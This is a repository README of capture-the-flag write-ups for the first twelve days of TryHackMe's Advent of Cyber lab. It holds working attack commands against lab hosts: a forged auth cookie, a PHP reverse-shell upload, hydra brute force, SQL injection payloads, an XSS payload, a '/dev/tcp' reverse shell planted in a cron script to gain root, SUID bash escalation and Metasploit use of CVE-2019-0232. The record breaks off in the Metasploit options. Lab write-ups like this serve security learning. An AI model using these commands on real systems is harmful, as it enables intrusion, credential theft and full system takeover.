# Try Hack Me Advent of Cyber

This repo contains a collection of bad writeups and bad solve scripts.  

Event Homepage: [`https://tryhackme.com/christmas`](https://tryhackme.com/christmas)

## Checklist

- [x] [Day 1 - A Christmas Crisis](#day-1-a-christmas-crisis)
- [x] [Day 2 - The Elf Strikes Back](#day-2-the-elf-strikes-back)
- [x] [Day 3 - Christmas Chaos](#day-3-christmas-chaos)
- [x] [Day 4 - Santa's watching](#day-4-santas-watching)
- [x] [Day 5 - Someone stole Santa's gift list!](#day-5-someone-stole-santas-gift-list)
- [x] [Day 6 - Be careful with what you wish on a Christmas night](#day-6-be-careful-with-what-you-wish-on-a-christmas-night)
- [x] [Day 7 - The Grinch Really Did Steal Christmas](#day-7-the-grinch-really-did-steal-christmas)
- [x] [Day 8 - What's Under the Christmas Tree?](#day-8-whats-under-the-christmas-tree)
- [x] [Day 9 - Anyone can be Santa!](#day-9-anyone-can-be-santa)
- [x] [Day 10 - Don't be Elfish!](#day-10-dont-be-elfish)
- [x] [Day 11 - The Rogue Gnome](#day-11-the-rogue-gnome)
- [x] [Day 12 - Ready, set, elf.](#day-12-ready-set-elf)
- [ ] Day 13 - Coal for Christmas
- [ ] Day 14 - Where's Rudolph?
- [ ] Day 15 - There's a Python in my stocking!
- [ ] Day 16 - Help! Where is Santa?
- [ ] Day 17 - ReverseELFneering
- [ ] Day 18 - The Bits of the Christmas
- [ ] Day 19 - The Naughty or Nice List
- [ ] Day 20 - PowershELlF to the rescue
- [ ] Day 21 - Time for some ELForensics
- [ ] Day 22 - Elf McEager becomes CyberElf
- [ ] Day 23 - The Grinch strikes again!
- [ ] Day 24 - The Trial Before Christmas

## Day 1: A Christmas Crisis

*Category: Web Exploitation*  
*Tags: HTTP, Cookies*  

> Understand how the web works and take back control of the Christmas Command Centre!

IP: `10.10.161.100`

### Basic enumeration

Firstly, I checked out the web server running on port 80 (HTTP).

![screenshot](day01-christmas-crisis/ChristmasControlCenterLogin.png)

I register for an account using the credentials `admin:bluemoon` and then log in with those credentials.

![screenshot](day01-christmas-crisis/ChirstmasControlCenterControlPanel.png)

### What is the name of the the cookie used for authentication?

The name of the authentication cookie is: `auth`.

### What format is the value of this cookie encoded and what format is the data stored in?

The value of the auth cookie is: `7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2261646d696e227d`.  

Putting the entire thing into [CyberChef](https://gchq.github.io/CyberChef/), we find that it is using `hexadecimal` to encode the string: `{"company":"The Best Festival Company", "username":"admin"}`.  

The data is stored in `JSON` format.  

### Bypassing the authentication

We can encode `{"company":"The Best Festival Company", "username":"santa"}` into hexadecimal to find the value of santa's authentication token.  

Value of the santa cookie: `7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2273616e7461227d`.  

After setting the auth cookie to that string, we get access to the santa account and full control panel access.

### Getting the flag

I'm not sure why but I got a bit stuck here. Turns out, you just flick all the switches and you get the final flag.

Flag: `THM{MjY0Yzg5NTJmY2Q1NzM1NjBmZWFhYmQy}`

### Making a [solve script](day01-christmas-crisis/solve.sh)

I noticed that the program sends a post request to `http://10.10.161.100/api/checkflag`. I noticed it also sent the cookie along with it. Therefore, I decided to send a POST request to the URL with the cookie and lo and behold, the flag! Here, I did it using curl in bash:  
```bash
curl -X POST -H "Cookie: auth=7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2273616e7461227d" http://10.10.161.100/api/checkflag;
```
I have also included the shell script I wrote in the day01-christmas-crisis directory. 

## Day 2: The Elf Strikes Back

*Category: Web*  
*Tags: RCE*  

> Learn about basic file upload filter bypasses by performing a security audit on the new security management server!

IP: `10.10.119.58`

### Basic enumeration

Firstly, I checked the HTTP server running on port 80.

![screenshot](day02-elf-strikes-back/initial_page.png)

### What string of text needs added to the URL to get access to the upload page?

We can use the id given to us (`ODIzODI5MTNiYmYw`) to find an upload page at `http://10.10.119.58/?id=ODIzODI5MTNiYmYw`.

![screenshot](day02-elf-strikes-back/initial_page_id.png)

### What type of file is accepted by the site?

If we examine the source code, we find the following the the HTML code:
```HTML
<input type=file id="chooseFile" accept=".jpeg,.jpg,.png">
```
It turns out that this page only accepts image files.

### In which directory are the uploaded files stored?

After poking around in the address bar, I found that the uploads are kept in the `/uploads/` directory.  

We can find the uploaded files at `http://10.10.119.58/uploads/`.

### Getting a shell

Firstly, I wanted to find out what was running the web server. Therefore, I opened the network tab and reloaded the page to get the response headers.

![screenshot](day02-elf-strikes-back/network_tab.png)

We see that the server is running Apache 2.4.37 on CentOS powered by PHP. Therefore, I got a PHP reverse shell script from [Pentest Monkey](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php).  

Be sure to change the following lines in the PHP file:
```php
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
```

Then, I renamed the file to `php-reverse-shell.jpg.php` to circumvent the checks and uploaded the file.

**Establishing the reverse shell connection**

Since I set the PHP reverse shell to connect on port 4444, I set up a netcat listener on that port.

```sh
nc -lvnp 4444
```

Finally, I visited the following URL `http://10.10.119.58/uploads/` to run the PHP script.  

I was then greated by this beautiful message:

```
Listening on 0.0.0.0 4444
Connection received on 10.10.119.58 54002
Linux security-server 4.18.0-193.28.1.el8_2.x86_64 #1 SMP Thu Oct 22 00:20:22 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 13:25:23 up 41 min,  0 users,  load average: 0.00, 0.00, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: cannot set terminal process group (823): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4$
```

Bingo! Now that we have a reverse shell, what next?

### What is the flag in /var/www/flag.txt?

First, I made sure I was successfully connected to the server:

```
sh-4.4$ whoami
whoami
apache
sh-4.4$ pwd
pwd
/
```

Now that we have a shell, we can read the flag:

```
sh-4.4$ cat /var/www/flag.txt
cat /var/www/flag.txt


==============================================================


You've reached the end of the Advent of Cyber, Day 2 -- hopefully you're enjoying yourself so far, and are learning lots! 
This is all from me, so I'm going to take the chance to thank the awesome @Vargnaar for his invaluable design lessons, without which the theming of the past two websites simply would not be the same. 


Have a flag -- you deserve it!
THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}


Good luck on your mission (and maybe I'll see y'all again on Christmas Eve)!
 --Muiri (@MuirlandOracle)


==============================================================
```

And so with that, we get a nice message and the flag.

Flag: `THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}`

## Day 3: Christmas Chaos

*Category: Web Exploitation*  
*Tags: Authentication Bypass*  

> Hack the hackers and bypass a login page to gain admin privileges.

IP: `10.10.88.75`

### Basic Enumeration

As always, we check out the webpage running on port 80 first.

![screenshot](day03-christmas-chaos/initial_page.png)

### Brute force attack

As suggested by the lesson on TryHackMe, we can use a dictionary attack to break the authentication and gain unauthorized access.  

First, I created the username and password wordlist using the dictionary provided ([username dictionary](day03-christmas-chaos/usernames.txt) and [password dictionary](day03-christmas-chaos/passwords.txt)).

Next, I monitored the network traffic in Firefox to see how the login request is being sent. Unsurprisingly, this web app sends a post request with the form data.

![screenshot](day03-christmas-chaos/network_tab.png)

Then I used the following `hydra` command to find the username and password. `-L` is used to specify the username dictionary, `-P` is used to specify the password dictionary, http-post-form and the string is used to specify how to send the login request. `^USER^` and `^PASS^` are replaced by the username or password from the wordlist respectively. `incorrect` at the very end it is part error message when we use the wrong username password combo.

```sh
hydra -L usernames.txt -P passwords.txt 10.10.88.75 http-post-form "/login:username=^USER^&password=^PASS^:incorrect"
```

And sure enough, we find the username and password:

```
[80][http-post-form] host: 10.10.88.75   login: admin   password: 12345
```

Now that we have credentials, we can log in and get the flag!

![screenshot](day03-christmas-chaos/flag.png)

Flag: `THM{885ffab980e049847516f9d8fe99ad1a}`

## Day 4: Santa's watching

*Category: Web Exploitation*  
*Tags: Authorization Bypass*  

> Exploit Santa's login form and obtain admin credentials to save Santa's nice list!

IP: `10.10.252.228`

Assets:
- Wordlist for Gobuster ([danielmiessler/SecLists/Discovery/Web-Content/big.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/big.txt))
- Wordlist for wfuzz ([available for download](https://assets.tryhackme.com/additional/cmn-aoc2020/day-4/wordlist)) (also in the day04-santas-watching directory)

### Given the URL `http://shibes.xyz/api.php`, what would the entire wfuzz command look like to query the "breed" parameter using the wordlist "big.txt" (assume that "big.txt" is in your current directory)

`wfuzz -z file,big.txt http://shibes.xyz/api.php?breed=FUZZ`

### Basic Enumeration

By know, you probably know the drill. Step 1: visit the website running on port 80.

![screenshot](day04-santas-watching/nothing.png)

Huh, there seems to be not much of interest on the page or in the source code for the page.

### Finding the API directory using Gobuster

We can use gobuster to find hidden directories:

```sh
gobuster -u http://10.10.252.228/ -w day04-santas-watching/big.txt -x php,txt,html
```

And we find the following:

```
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.252.228/
[+] Threads      : 10
[+] Wordlist     : day04-santas-watching/big.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : html,php,txt
[+] Timeout      : 10s
=====================================================
2020/12/04 15:24:55 Starting gobuster
=====================================================
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.txt (Status: 403)
/.htaccess (Status: 403)
/.htpasswd.html (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.html (Status: 403)
/LICENSE (Status: 200)
/api (Status: 301)
```

If we visit `http://10.10.252.228/api` we can find the empty `site-log.php` file.

### Fuzz the date parameter on the file you found in the API directory. What is the flag displayed in the correct post?

We can use the following wfuzz command to fuzz the date get parameter:

```sh
wfuzz -c --hh 0 -z file,day04-santas-watching/wordlist http://10.10.252.228/api/site-log.php?date=FUZZ
```

After running the command, we get the following output:

```
Target: http://10.10.252.228/api/site-log.php?date=FUZZ
Total requests: 63

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                                                     
===================================================================

000000026:   200        0 L      1 W      13 Ch       "20201125"                                                                                                                                                  

Total time: 3.005774
Processed Requests: 63
Filtered Requests: 62
Requests/sec.: 20.95965
```

### Getting the flag

Now that we know where to find the flag, we can simply use cURL to actually get the flag:

```
curl http://10.10.252.228/api/site-log.php?date=20201125
```

Flag: `THM{D4t3_AP1}`

## Day 5: Someone stole Santa's gift list!

*Category: Web Exploitation*  
*Tags: SQL injection, PHP*  

> Learn to detect and exploit one of the most dangerous web vulnerabilities!

IP: `10.10.220.236`  
Port: `8000`

### Without using directory brute forcing, what's Santa's secret login panel?

Using the hint, we know that the panel is located at `/santapanel`

![screenshot](day05-someone-stole-santas-gift-list/panel_login.png)

### Bypass the login using SQL injection

Visiting `10.10.220.236:8000/santapanel`, we see there is a login page which I assumed to be vulnerable to SQLi. Therefore, I tried the following payload and sure enough, I was able to gain access to the santapanel

```
' OR 1==1;--
```

The full SQL command would then look something like this:

```sql
SELECT * FROM some_table WHERE username='' OR 1==1;-- AND password='';
```

As you can see, every entry in this tabble will be returned even if the username doesn't match since 1==1 always evaluates to true.

![screenshot](day05-someone-stole-santas-gift-list/panel_page.png)

### How many entries are there in the gift database?

We can supply a wildcard character (`%`) to select every entry into the database. If we count them, we see that we have 22 entries.

We also see that `Paul` asked for `github ownership`.

### Finding the flag

First we need to find the table names and their schema. We do so using the following SQLi payload to union the tbl_name and sql fields from the sqlite_master table:

```
%' UNION SELECT tbl_name, sql FROM sqlite_master;--
```
Which expands to the following:
```sql
SELECT gift, child FROM some_table WHERE gift LIKE '%' UNION SELECT tbl_name, sql FROM sqlite_master;--;
```

We get the following result:

```
hidden_table | CREATE TABLE hidden_table (flag text)
sequels | CREATE TABLE sequels (title text, kid text, age integer)
users | CREATE TABLE users (username text, password text)
```

To get the flag, we can use the following SQLi payload

```
%' UNION SELECT 1, flag FROM hidden_table;--
```
Which expands to the following:
```sql
SELECT gift, child FROM some_table WHERE gift LIKE '%' UNION SELECT 1, flag FROM hidden_table;--;
```

Then we find the flag in the table.

Flag: `thmfox{All_I_Want_for_Christmas_Is_You}`

### Getting the admin password

Once again, we use a SQLi payload.

```
%' UNION SELECT username, password FROM users;--
```

In the table we can find the admin's password.

```
admin:EhCNSWzzFP6sc7gB
```

## Day 6: Be careful with what you wish on a Christmas night

*Category: Web Exploitation*  
*Tags: JavaScript*  

> Get familiar with compromising user interactions with vulnerable applications by executing custom javascript code.

IP: `10.10.157.100`  
Port: `5000`

### Finding the cross-site scripting

![screenshot](day06-be-careful-with-what-you-wish-for-on-a-christmas-night/make_a_wish.png)

#### Stored cross-site scripting

Found in the `enter a wish here` box.

![screenshot](day06-be-careful-with-what-you-wish-for-on-a-christmas-night/stored_xss.png)

#### Reflected cross-site scripting

Found in the `search query` box.

![screenshot](day06-be-careful-with-what-you-wish-for-on-a-christmas-night/reflected_xss.png)

#### How to exploit?

Type the following payload into either of them to see a cross-site scripting pop-up:

```html
<script>alert("XSS");</script>
```

### Getting the flag

Well unfortunately, there is no flag for this challenge. So here's a fake flag that I made!

![screenshot](day06-be-careful-with-what-you-wish-for-on-a-christmas-night/fake_flag.png)

## Day 7: The Grinch Really Did Steal Christmas

> Understand a few of the technologies that power the internet! Use this knowledge to track the activity of the Grinch who stole christmas!

*Category: Networking*  
*Tags: Wireshark, Packet Analysis*  

File: [aoc-pcaps.zip](day07-the-grinch-really-did-steal-christmas/aoc.pcaps.zip)  
Prerequesite Software: Wireshark  

### Unzipping

Before we begin, we must unzip the file as follows:

```sh
cd day07-the-grinch-really-did-steal-christmas/
unzip aoc-pcaps.zip
```

And we see that there are 3 `.pcap` files:

```
Archive:  aoc-pcaps.zip
  inflating: pcap1.pcap              
  inflating: pcap2.pcap              
  inflating: pcap3.pcap 
```

### pcap1.pcap

#### Open "pcap1.pcap" in Wireshark. What is the IP address that initiates an ICMP/ping?

We open pcap1.pcap in Wireshark and look for the source IP of the ping request.

![screenshot](day07-the-grinch-really-did-steal-christmas/pcap1_ping.png)

We see that `10.11.3.2` is pinging `10.10.15.52`.

#### Filtering to see HTTP GET requests

The `http.request.method == get` filter can be used to only see the HTTP GET requests.  

We can use this filter (`http.request.method == GET && ip.src == 10.10.67.199`) to further narrow it down as needed.  

Sifting through the packets, we can see that `10.10.67.199` read `reindeer-of-the-week`.  

![screenshot](day07-the-grinch-really-did-steal-christmas/reindeer-of-the-week.png)

### pcap2.pcap

#### Find the password used for FTP

We filter the traffic by using the protocol `FTP`.  

![screenshot](day07-the-grinch-really-did-steal-christmas/finding_password.png)

Then we can follow the TCP stream to find the password.  

![screenshot](day07-the-grinch-really-did-steal-christmas/follow_ftp_tcp.png)

The leaked password is: `plaintext_password_fiasco`  

#### What is the name of the protocol that is encrypted?

Looking at the wireshark, we can see the SSH protocol which is encrypted.

![screenshot](day07-the-grinch-really-did-steal-christmas/ssh.png)

### pcap3.pcap

Looking through wireshark, we see a lot of SSH and HTTP traffic. Since SSH is encrypted, the HTTP is more interesting. We see that there is downloading of files specifically a `christmas.zip` file, so we extract that and save it onto out machine for further investigation.

![screenshot](day07-the-grinch-really-did-steal-christmas/export_objects.png)

![screenshot](day07-the-grinch-really-did-steal-christmas/http_object_list.png)

Then we can unzip `christmas.zip`. We find the following files:

```
Archive:  christmas.zip
  inflating: AoC-2020.png            
  inflating: christmas-tree.jpg      
  inflating: elf_mcskidy_wishlist.txt  
  inflating: Operation Artic Storm.pdf  
  inflating: selfie.jpg              
  inflating: tryhackme_logo_full.svg  
```

We can read Elf McSkidy's wishlist using the following command:

```
cat day07-the-grinch-really-did-steal-christmas/christmas/elf_mcskidy_wishlist.txt
```

And we see the following:

```
Wish list for Elf McSkidy
-------------------------
Budget: £100

x3 Hak 5 Pineapples
x1 Rubber ducky (to replace Elf McEager)
```

## Day 8: What's Under the Christmas Tree?

*Category: Networking*  
*Tags: Nmap*  

> Practice the most fundamental stage of penetration testing: information gathering, using industry standard tools/techniques.

IP: `10.10.2.45`

### Running the Nmap scan

We run nmap with the following command:

```sh
nmap -sC -sV -A -O -oN day08-whats-under-the-christmas-tree/nmap.log 10.10.2.45
```

And we get the following results:

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-08 13:15 EST
Nmap scan report for tbfc.blog (10.10.2.45)
Host is up (0.11s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Hugo 0.78.2
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: TBFC&#39;s Internal Blog
2222/tcp open  ssh           OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 cf:c9:99:d0:5c:09:27:cd:a1:a8:1b:c2:b1:d5:ef:a6 (RSA)
|   256 4c:d4:f9:20:6b:ce:fc:62:99:54:7d:c2:b4:b2:f2:b2 (ECDSA)
|_  256 d0:e6:72:18:b5:20:89:75:d5:69:74:ac:cc:b8:3b:9b (ED25519)
3389/tcp open  ms-wbt-server xrdp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.52 seconds
```

### What ports are open?

- Port 80 for HTTP
- Port 2222 for SSH
- Port 3389 for ms-wbt-server

### What Linux Distribution is the box?

`Ubuntu`

### What is the "HTTP-TITLE" for the webserver

`http-title: TBFC&#39;s Internal Blog`

## Day 9: Anyone can be Santa!

*Category: Networking*
*Tags: FTP*

>Discover a common misconfiguration on file transfer servers, and understand how it may be abused.

IP: `10.10.112.57`

### Connecting to the FTP server and basic enumeration

In a Linux Terminal, I used the `ftp` command and connected to the FTP server as `anonymous`.

```
ftp 10.10.112.57
```

Now that we are in, let's see what files we can find...

```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Nov 16 15:04 backups
drwxr-xr-x    2 0        0            4096 Nov 16 15:05 elf_workshops
drwxr-xr-x    2 0        0            4096 Nov 16 15:04 human_resources
drwxrwxrwx    2 65534    65534        4096 Nov 16 19:35 public
```

`backups`, `elf_workshops` and `human_resources` appear to be empty. However, let's investigate `public` further.

```
ftp> cd public
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xr-x    1 111      113           341 Nov 16 19:34 backup.sh
-rw-rw-rw-    1 111      113            24 Nov 16 19:35 shoppinglist.txt
226 Directory send OK.
```

Interesting, let's download these two files to examine them further...

```
ftp> get backup.sh
local: backup.sh remote: backup.sh
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for backup.sh (341 bytes).
226 Transfer complete.
341 bytes received in 0.00 secs (481.9216 kB/s)
ftp> get shoppinglist.txt
local: shoppinglist.txt remote: shoppinglist.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for shoppinglist.txt (24 bytes).
226 Transfer complete.
24 bytes received in 0.00 secs (107.0206 kB/s)
```

Success!

### shoppinglist.txt

It turns out, `shoppinglist.txt` isn't all that interesting... All we learn is that Santa has `The Polar Express Movie` on his shopping list.

### backup.sh

`backup.sh`? More like `backdoor.sh`...  

This bash shell script seams to be a cron job (something that runs automatically at a set time or time interval on a Linux system). Let's modify it to set up a reverse shell! First, I set up a netcat listener of port 4444 by running `nc -lvnp 4444`. Then, I added the following line to `backup.sh` before uploading it to the FTP server. (note: `10.6.23.34` is the IP of my attack machine)

```sh
# Added this line
bash -i >& /dev/tcp/10.6.23.34/4444 0>&1
```

### Becoming root and getting the flag!

First, I uploaded the `backup.sh` file with the payload from the previous section using FTP:

```
ftp> put backup.sh 
local: backup.sh remote: backup.sh
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
381 bytes sent in 0.00 secs (5.7675 MB/s)
```

Sure enough, I got the reverse shell within seconds:

```
Listening on 0.0.0.0 4444
Connection received on 10.10.112.57 60270
bash: cannot set terminal process group (1525): Inappropriate ioctl for device
bash: no job control in this shell
root@tbfc-ftp-01:~# whoami
whoami
root
```

Now, that we are root, we can read `/root/flag.txt` and get the flag!

```
root@tbfc-ftp-01:~# cat /root/flag.txt
cat /root/flag.txt
THM{even_you_can_be_santa}
```

Flag: `THM{even_you_can_be_santa}`

## Day 10: Don't be Elfish!

*Category: Networking*
*Tags: SMB*

> Get hands-on with Samba, a protocol used for sharing resources like files and printers with other devices.

IP: `10.10.111.123`

### Getting Enum4Linux

[Click here to view `enum4linux.pl` on GitHub](https://github.com/CiscoCXSecurity/enum4linux/blob/master/enum4linux.pl)  

(It can also be found on the THM Attackbox here: `/root/Desktop/Tools/Miscellaneous/enum4linux.pl`)

### Basic Enumeration

We can begin by looking for users and shares on the box using this command:

```
./enum4linux.pl -U -S 10.10.111.123
```

And we find the following 3 users:

```
 ============================== 
|    Users on 10.10.111.123    |
 ============================== 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: elfmcskidy       Name:   Desc: 
index: 0x2 RID: 0x3ea acb: 0x00000010 Account: elfmceager       Name: elfmceager        Desc: 
index: 0x3 RID: 0x3e9 acb: 0x00000010 Account: elfmcelferson    Name:   Desc: 

user:[elfmcskidy] rid:[0x3e8]
user:[elfmceager] rid:[0x3ea]
user:[elfmcelferson] rid:[0x3e9]
```

We also find the following 4 shares:

```
 ========================================== 
|    Share Enumeration on 10.10.111.123    |
 ========================================== 

        Sharename       Type      Comment
        ---------       ----      -------
        tbfc-hr         Disk      tbfc-hr
        tbfc-it         Disk      tbfc-it
        tbfc-santa      Disk      tbfc-santa
        IPC$            IPC       IPC Service (tbfc-smb server (Samba, Ubuntu))
```

### Connecting to the Samba server

We can use smbclient to connect to the Samba servers. After some testing, I noticed that the tbfc-santa share doesn't require a password to login as root.

```
smbclient -U root //10.10.111.123/tbfc-santa
```

After logging in, we find the `jingle-tunes` directory and the `note_from_mcskidy.txt` file.

```
smb: \> ls
  .                                   D        0  Wed Nov 11 21:12:07 2020
  ..                                  D        0  Wed Nov 11 20:32:21 2020
  jingle-tunes                        D        0  Wed Nov 11 21:10:41 2020
  note_from_mcskidy.txt               N      143  Wed Nov 11 21:12:07 2020

                10252564 blocks of size 1024. 5200032 blocks available
```

There is nothing else for us to look at. This is also the end of this challenge.

## Day 11: The Rogue Gnome

*Category: Networking*
*Tags: Privilege Escalation, Linux*

> We've got initial access, but now what? Learn some of the common linux privilege escalation techniques used to gain permissions to things that we shouldn't...

IP: `10.10.43.93`

### Basic Questions

#### What type of privilege escalation involves using a user account to execute commands as an administrator?

`vertical`

#### What is the name of the file that contains a list of users who are a part of the sudo group?

`sudoers`

### Connecting via SSH

For this challenge, we assume we have found a vulnerability to get a shell on the box. We can simulate this using an SSH connection with the credentials: `cmnatic:aoc2020`.

```
ssh cmnatic@10.10.43.93
```

After connecting, we are greated with a bash shell:

```
Last login: Fri Dec 11 18:17:18 2020 from 10.6.23.34
-bash-4.4$ whoami
cmnatic
```

### Privilege Escalation

Unfortunately (and unsurprisingly), the account we are given doesn't have root privileges.  

As suggested by THM, we can probably find a SUID binary to exploit. We can look for them by running:

```
find / -perm -u=s -type f 2>/dev/null
```

And we get the following output (note: I have ommited all of the snap files):

```
-bash-4.4$ find / -perm -u=s -type f 2>/dev/null
/bin/umount
/bin/mount
/bin/su
/bin/fusermount
/bin/bash
/bin/ping
/usr/bin/newgidmap
/usr/bin/at
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/newuidmap
/usr/bin/traceroute6.iputils
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
```

OMG, `/bin/bash` is a SUID binary?!?! Ok, this looks really easy! I check out the [GTFObins](https://gtfobins.github.io/gtfobins/bash/) entry for bash and find out how to run it using SUID. Turns out all I need to type is `/bin/bash -p`. I run that command and boom, I have a shell as root!

```
bash-4.4# whoami
root
```

***Another way to find the misconfigured SUID binaries would be to use [Linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)***

### Getting the flag

Now that I am root, getting the flag is very straight forward. All we need to do is `cat` the flag!

```
cat /root/flag.txt
```

Flag: `thm{2fb10afe933296592}`

## Day 12: Ready, set, elf!

*Category: Networking*
*Tags: Public Exploits*

> Learn how vulnerabilities can be identified, use public knowledgebases to search for exploits and leverage these on this Windows box; So quit slackin' and get whackin'!

IP: `10.10.143.182`

### Vulnerability Knowledge Bases

Examples include:
- Rapid7
- AttackerKB
- MITRE
- Exploit-DB

### Basic enumeration

Before we begin, we ping the machine:

```
mshen@dragonfly:~/ctf/thm/thm-advent/day12-ready-set-elf$ ping 10.10.143.182
PING 10.10.143.182 (10.10.143.182) 56(84) bytes of data.
^C
--- 10.10.143.182 ping statistics ---
4 packets transmitted, 0 received, 100% packet loss, time 3065ms
```

Interesting, this machine doesn't respond to ping requests... anyways, we shall forge ahead.

First, we can use Nmap to scan the machine.

```
nmap -sC -sV -Pn -oN nmap.log 10.10.143.182
```

We get the following results:

```log
# Nmap 7.80 scan initiated Sat Dec 12 14:14:26 2020 as: nmap -sC -sV -Pn -oN nmap.log 10.10.143.182
Nmap scan report for 10.10.143.182
Host is up (0.11s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: TBFC-WEB-01
|   NetBIOS_Domain_Name: TBFC-WEB-01
|   NetBIOS_Computer_Name: TBFC-WEB-01
|   DNS_Domain_Name: tbfc-web-01
|   DNS_Computer_Name: tbfc-web-01
|   Product_Version: 10.0.17763
|_  System_Time: 2020-12-12T19:14:46+00:00
| ssl-cert: Subject: commonName=tbfc-web-01
| Not valid before: 2020-11-27T01:29:04
|_Not valid after:  2021-05-29T01:29:04
|_ssl-date: 2020-12-12T19:14:47+00:00; -1s from scanner time.
8009/tcp open  ajp13         Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http          Apache Tomcat 9.0.17
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.17
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Dec 12 14:14:48 2020 -- 1 IP address (1 host up) scanned in 21.81 seconds
```

### What is the version number of the web server?

We can see the HTTP Apache Tomcat server is running on port 8080. In the Nmap scan, we can also see that the version number is `9.0.17`.

Here is what the webpage looks like if we open it in a browser:

![screenshot](day12-ready-set-elf/apache_tomcat.png)

Based on the lesson writeup from CMNatic, I also check out `http://10.10.143.182:8080/cgi-bin/elfwhacker.bat` and I found this:

```
-------------------------------------------------------
Written by ElfMcEager for The Best Festival Company ~CMNatic
-------------------------------------------------------

Current time: 12/12/2020 20:33:34.06

-------------------------------------------------------
                 Debugging Information
-------------------------------------------------------
Hostname: TBFC-WEB-01
User: tbfc-web-01\elfmcskidy

-------------------------------------------------------
                  ELF WHACK COUNTER
-------------------------------------------------------

 Number of Elves whacked and sent back to work: 31469
```

### Finding the vulnerability using searchsploit

I used [CVE Details](https://www.cvedetails.com/version/280286/Apache-Tomcat-9.0.17.html) to find the vulnerabilities affecting `Apache Tomcat v9.0.17`.

![screenshot](day12-ready-set-elf/cve_details_overview.png)

I then found out that [`CVE-2019-0232`](https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-887/version_id-280286/year-2019/opec-1/Apache-Tomcat-9.0.17.html) would allow me to gain remote code execution.

![screenshot](day12-ready-set-elf/cve_details_vuln.png)

The description say:

```
When running on Windows with enableCmdLineArguments enabled, the CGI Servlet in Apache Tomcat 9.0.0.M1 to 9.0.17, 8.5.0 to 8.5.39 and 7.0.0 to 7.0.93 is vulnerable to Remote Code Execution due to a bug in the way the JRE passes command line arguments to Windows. The CGI Servlet is disabled by default. The CGI option enableCmdLineArguments is disable by default in Tomcat 9.0.x (and will be disabled by default in all versions in response to this vulnerability). For a detailed explanation of the JRE behaviour, see Markus Wulftange's blog (https://codewhitesec.blogspot.com/2016/02/java-and-command-line-injections-in-windows.html) and this archived MSDN blog (https://web.archive.org/web/20161228144344/https://blogs.msdn.microsoft.com/twistylittlepassagesallalike/2011/04/23/everyone-quotes-command-line-arguments-the-wrong-way/).
```

### Running the exploit using Metasploit

We start metasploit by running `msfconsole`.

First, we search and select the exploit we would like to use:

```
msf6 > search 2019-0232

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/windows/http/tomcat_cgi_cmdlineargs  2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability


msf6 > use exploit/windows/http/tomcat_cgi_cmdlineargs
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) >
```

Next, let's check out which options we need to set:

```
msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > show options

Module options (exploit/windows/http/tomcat_cgi_cmdlineargs):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
